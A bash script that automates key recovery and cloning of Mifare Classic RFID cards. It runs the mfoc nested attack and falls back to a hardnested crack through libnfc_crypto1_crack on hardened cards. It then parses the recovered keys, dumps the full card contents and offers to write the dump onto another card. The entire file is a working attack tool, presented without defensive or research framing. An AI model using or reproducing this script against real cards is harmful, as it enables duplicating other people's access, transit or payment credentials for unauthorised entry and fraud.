#!/bin/bash

# This is a general-purpose function to ask Yes/No questions in Bash, either
# with or without a default answer. It keeps repeating the question until it
# gets a valid answer.

ask() {
    local prompt default REPLY

    while true; do

        if [ "${2:-}" = "Y" ]; then
            prompt="Y/n"
            default=Y
        elif [ "${2:-}" = "N" ]; then
            prompt="y/N"
            default=N
        else
            prompt="y/n"
            default=
        fi

        # Ask the question (not using "read -p" as it uses stderr not stdout)
        echo -n "$1 [$prompt] "

        # Read the answer (use /dev/tty in case stdin is redirected from somewhere else)
        read REPLY </dev/tty

        # Default?
        if [ -z "$REPLY" ]; then
            REPLY=$default
        fi

        # Check if the reply is valid
        case "$REPLY" in
            Y*|y*) return 0 ;;
            N*|n*) return 1 ;;
        esac

    done
}

myUID=$(nfc-list -t 1|sed -n 's/ //g;/UID/s/.*://p')
TMPFILE_MFD="mfc_${myUID}_dump.mfd"
TMPFILE_UNK="mfc_${myUID}_unknownMfocSectorInfo.txt"
TMPFILE_FND="mfc_${myUID}_foundKeys.txt"
TMPFILE_MFOC_LOG="mfc_${myUID}_mfoc_log.txt"

MFOC_ARGS=(-O "${TMPFILE_MFD}" -D "${TMPFILE_UNK}")
if [ -f "extended-std.keys" ]; then
    MFOC_ARGS=(-f "extended-std.keys" "${MFOC_ARGS[@]}")
fi
if [ -f "$TMPFILE_FND" ]; then
    MFOC_ARGS=(-f "${TMPFILE_FND}" "${MFOC_ARGS[@]}")
fi
mfoc "${MFOC_ARGS[@]}" | tee "${TMPFILE_MFOC_LOG}"

if [ ! -f "$TMPFILE_FND" ]; then
    sed '/^Sector/!d;s/Sector\s[0-9][0-9]*\s-\s//g;s/\(Found\|Unknown\)\s\s*Key\s\(A\|B\):*\s*\(\S*\)/\3/g;s/\(\S\S*\)\s\s*\(\S\S*\)/\1\n\2/g' "${TMPFILE_MFOC_LOG}" | sort | uniq > "${TMPFILE_FND}"
fi

mfocResult=${PIPESTATUS[0]}
prngNotVulnerable=9
keepTrying=1
foundKeysForMFOC=" "

while [ $keepTrying -eq 1 ]; do
    #echo "MFOC result: $mfocResult"
    if [ "$mfocResult" == "$prngNotVulnerable" ]; then
        echo "MFOC not possible, detected hardened Mifare Classic"
        if [ "$mfocResult" -eq 9 ]; then
            count=0
            while read -r LINE; do
                let count++
                #echo "$count $LINE"
            done < "$TMPFILE_UNK"

            arr=($(echo "$LINE" | tr ';' ' '))
            #echo ${arr[0]}
            #echo ${arr[1]}
            #echo ${arr[2]}
            #echo ${arr[3]}
            #echo ${arr[4]}
		
	    temp=($(echo ${arr[0]}|fold -w2))
            knownKey=${temp[5]}${temp[4]}${temp[3]}${temp[2]}${temp[1]}${temp[0]}
            knownSectorNum=${arr[1]}
            knownKeyLetter=${arr[2]}
            unknownSectorNum=${arr[3]}
            unknownKeyLetter=${arr[4]}
            knownBlockNum=$((knownSectorNum * 4))
            unknownBlockNum=$((unknownSectorNum * 4))
            if [ "$knownSectorNum" -gt 31 ]; then
                knownBlockNum=$((128+((knownSectorNum-32)*16)))
            fi
            if [ "$unknownSectorNum" -gt 31 ]; then
                unknownBlockNum=$((128+((unknownSectorNum-32)*16)))
            fi
            echo "Trying HardNested Attack..."
            mycmd=(libnfc_crypto1_crack "$knownKey" "$knownBlockNum" "$knownKeyLetter" "$unknownBlockNum" "$unknownKeyLetter" "$TMPFILE_FND")
            echo "${mycmd[@]}"
            "${mycmd[@]}"
        else
            echo "mfoc returned: $mfocResult"
            keepTrying=0
        fi

        cryptoCrackResult=$?
        if [ "$cryptoCrackResult" -eq 0 ];then
            while read -r LINE
            do
            echo "$LINE"
            done < "$TMPFILE_FND"

            #arr=(`echo $LINE | tr ';' ' '`)
            #echo ${arr[0]}
            #echo ${arr[1]}
            #echo ${arr[2]}
            #foundKeysForMFOC="$foundKeysForMFOC-k ${arr[0]} "
            mycmd=(mfoc -f "$TMPFILE_FND" -O "$TMPFILE_MFD"  -D "$TMPFILE_UNK")
            echo "${mycmd[@]}"
            "${mycmd[@]}"
            mfocResult=$?
        fi
    else
        keepTrying=0
    fi
done

rm -f "$TMPFILE_UNK" "0x${myUID}_"*".txt"
if [ $mfocResult -eq 0 ]; then
    echo -e "\n\nDump left in: $TMPFILE_MFD"
    if ask "Do you want clone the card? Place card on reader now and press Y"; then
         nfc-mfclassic W a $TMPFILE_MFD
    fi
else
    rm -f "$TMPFILE_MFD"
fi
